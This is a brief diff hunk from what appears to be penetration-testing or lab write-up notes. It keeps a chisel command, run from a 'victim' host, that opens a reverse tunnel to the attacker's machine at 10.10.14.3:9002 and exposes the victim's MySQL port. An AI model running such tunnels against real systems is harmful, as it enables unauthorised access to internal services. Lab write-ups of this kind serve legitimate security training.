@@ -189,8 +189,6 @@
 
       From victim:
 
-      Listen on victim 80, forward to localhost port 80 on client:
-
       `./chisel client 10.10.14.3:9002 R:3306:127.0.0.1:3306`
 
       We can now access MySQL (3306) from our attacking machine.
